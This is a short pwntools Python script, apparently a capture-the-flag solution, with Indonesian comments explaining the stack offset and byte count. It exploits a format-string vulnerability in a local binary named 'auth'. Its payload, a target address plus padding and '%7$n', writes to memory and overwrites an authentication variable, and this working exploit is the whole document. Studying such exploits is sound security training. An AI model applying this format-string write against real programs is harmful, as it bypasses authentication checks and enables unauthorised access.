from pwn import *
elf = context.binary = ELF("./auth")
p = process()
auth_var = p32(0x0804c028)
payload = auth_var
payload += b"A" * 6
payload += b"%7$n" #auth_address berada di lokasi %7$p, dan akan kita akses dengan %7$n, %7$n berarti tulis seluruh panjang byte di depan %7$n dan tanamkan di address yang ada di stack ke 7
p.sendline(payload) # jadi karena auth address hanya 4 byte, maka kita perlu tambahan 6 lagi, makanya aku tulis a sebanyak 6 kali
print(p.recvall()) # akan menjadi 0x0804c028(4byte)AAAAAA(6byte)%7$n(4 + 10 dimasukkan ke address -> 0x0804c028 yang berada di stack ke 7)